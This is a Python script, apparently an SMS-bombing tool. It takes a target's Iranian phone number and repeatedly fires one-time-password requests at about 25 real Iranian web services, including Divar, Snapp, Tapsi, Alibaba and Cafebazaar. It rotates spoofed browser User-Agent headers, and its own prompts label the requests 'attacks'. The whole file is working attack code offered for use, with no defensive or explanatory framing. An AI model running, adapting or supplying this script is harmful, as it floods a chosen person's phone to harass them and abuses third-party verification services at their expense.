import requests
import random
import time

######################
black = '\033[30m'
white = '\033[37m'
Blue ="\033[1;34m"
yellow = '\033[33m'
Red="\033[1;31m"
Green="\033[1;33m"
pink = "\033[95m"
Grey="\033[1;30m"
Reset="\033[0m"
cyan = "\033[36m"
purple = "\033[35m"
######################

number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)

attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset)))

sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))

numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))

i = 0



url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone":"+98" + number}

url_sheypoor= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheypoor= {"username":"0" + number}

url_jet= "https://api.digikalajet.ir/user/login-register/"
json_jet= {"phone":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

url_snapp_box= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_snapp_box= {"phoneNumber":"0" + number}


url_banimode = "https://mobapi.banimode.com/api/v2/auth/request"
json_banimode = {"phone": "0" + number}

url_ostadkr = "https://api.ostadkr.com/login"
json_ostadkr = {"mobile": "0" + number}

url_drnext = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
json_drnext = {"mobile": "0" + number}

url_snapp = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}"

url_basalam = "https://auth.basalam.com/otp-request"
json_basalam = {
"client_id": 11,
"mobile": "0"+number}

url_buskool = "https://www.buskool.com/send_verification_code"
json_buskool = {"phone": "0" + number}
url_jabama = "https://taraazws.jabama.com/api/v4/account/send-code"
json_jabama = {"mobile": "0" + number}

url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba = {"phoneNumber": "0"+number}


url_digitoon = "https://apitwo.digitoon.ir/mobile_login_step1/8?dg_id=99E3A80D%2C99E3A80D"
json_digitoon = {
        "device_id": "desktop",
        "device_model": "browser-none-none-Firefox-112",
        "device_os": "NextJS-10-Windows",
        "mobile": "0"+number
    }
    
url_sibapp = "https://api.sibapp.net/api/v1/user/register"
json_sibapp ={"phone_number": "0" + number}

url_Drdr= "https://drdr.ir/api/registerEnrollment/register/verify"
json_Drdr = {
	"phoneNumber": "0" + number,
	"userType": "PATIENT"
    }

url_kukala= "https://api.kukala.ir/api/user/Otp"
json_kukala = {"phoneNumber": "0" + number}

url_tapsi = "https://api.tapsi.cab/api/v2.2/user"
json_tapsi = {
        "credential": {
            "phoneNumber": "0" + number,
            "role": "PASSENGER"
        },
        "otpOption": "SMS"
    }

url_flightio = "https://flightio.com/bff/Authentication/CheckUserKey"
json_flightio = {
        "userKey": "98-" + number,
        "userKeyType": 1
    }

url_football_360 = "https://football360.ir/api/auth/verify-phone/"
json_football_360 = {"phone_number": "+98" + number}



url_miare = "https://www.miare.ir/api/otp/driver/request/"
json_miare = {"phone_number": "0" + number}

url_pinket = "https://pinket.com/api/cu/v2/phone-verification"
json_pinket = {"phoneNumber": "0" + number}

url_torob = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{number}"

url_cafebazaar = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
json_cafebazaar = {
	"properties": {
		"clientID": "ukdor3dqin5dr1wy0jcrjfy94q0d0v4g",
		"clientVersion": "web",
		"deviceID": "ukdor3dqin5dr1wy0jcrjfy94q0d0v4g",
		"language": 2
	},
	"singleRequest": {
		"getOtpTokenRequest": {
			"username": "98" + number
		}
	}
}

































#  from date import url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket, heads, url_tci


heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
     {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
    'accept': '*/*'
    },
    {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'accept': '*/*'
    }
]


#while True:
while i < numbert:
    random_head = random.choice(heads)

    req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print("1-divar",req_divar)
    time.sleep(sleep_time)

    req_snapp = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print("2-snapp",req_snapp)
    time.sleep(sleep_time)

    req_sheypoor = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
    print("3-sheypoor",req_sheypoor)
    time.sleep(sleep_time)

    req_jet = requests.post(url= url_jet,json=json_jet,headers=random_head)
    print("4-jet",req_jet)
    time.sleep(sleep_time)

    req_virgool = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
    print("5-virgool",req_virgool)
    time.sleep(sleep_time)

    req_snapp_box = requests.post(url= url_snapp_box,json=json_snapp_box,headers=random_head)
    print("6-snapp_box",req_snapp_box)
    time.sleep(sleep_time)

    req_banimode = requests.post(url=url_banimode,json=json_banimode,headers=random_head)
    print("7-banimode",req_banimode)
    time.sleep(sleep_time)

    req_ostadkr = requests.post(url=url_ostadkr,json=json_ostadkr,headers=random_head)
    print("8-ostadkr",req_ostadkr)
    time.sleep(sleep_time)

    req_drnext = requests.post(url=url_drnext,json=json_drnext,headers=random_head)
    print("9-drnext",req_drnext)
    time.sleep(sleep_time)

    req_snapp_market = requests.post(url_snapp,data=number,headers=random_head)
    print("10-snapp_market",req_snapp_market)
    time.sleep(sleep_time)

    req_basalam = requests.post(url= url_basalam,json=json_basalam,headers=random_head)
    print("11-basalam",req_basalam)
    time.sleep(sleep_time)

    req_buskool = requests.post(url= url_buskool,json=json_buskool,headers=random_head)
    print("12-buskool",req_buskool)
    time.sleep(sleep_time)

    req_jabama = requests.post(url= url_jabama,json=json_jabama,headers=random_head)
    print("13-jabama",req_jabama)
    time.sleep(sleep_time)

    req_alibaba = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
    print("14-alibaba",req_alibaba)
    time.sleep(sleep_time)

    req_digitoon = requests.post(url=url_digitoon,json=json_digitoon,headers=random_head)
    print("15-Digoon",req_digitoon)
    time.sleep(sleep_time)

    req_sibapp = requests.post(url=url_sibapp,json=json_sibapp,headers=random_head)
    print("16-Sibapp",req_sibapp)

    req_Drdr = requests.post(url=url_Drdr,json=json_Drdr,headers=random_head)
    print("17-Drdr",req_Drdr)

    req_kukala = requests.post(url=url_kukala,json=json_kukala,headers=random_head)
    print("18-kukala",req_kukala)

    req_tapsi = requests.post(url=url_tapsi,json=json_tapsi,headers=random_head)
    print("19-Tapsi",req_tapsi)

    req_flightio = requests.post(url=url_flightio,json=json_flightio,headers=random_head)
    print("20-Flightio",req_flightio)

    req_football_360 = requests.post(url=url_football_360,json=json_football_360,headers=random_head)
    print("21-Football_360",req_football_360)

    req_miare = requests.post(url=url_miare,json=json_miare,headers=random_head)
    print("22-miare",req_miare)

    req_pinket = requests.post(url=url_pinket,json=json_pinket,headers=random_head)
    print("23-pinket",req_pinket)

    req_torob = requests.get(url=url_torob)
    print("24_torob",req_torob)

    req_cafebazaar = requests.post(url=url_cafebazaar,json=json_cafebazaar,headers=random_head)
    print("25-cafebazaar",req_cafebazaar)








    if i % 2 == 0:
        print(Blue + "Send all requests")
    else:
        print(yellow + "Send all requests")
    
    print("" + cyan + "[" + Red + "Number" + cyan + "]─[" + Blue + "of" + cyan + "]─[" + Green + "repetitions :" + cyan + "]" + Red + ": " + cyan + "[" + Green + str(i) + cyan + "]")

    i += 1
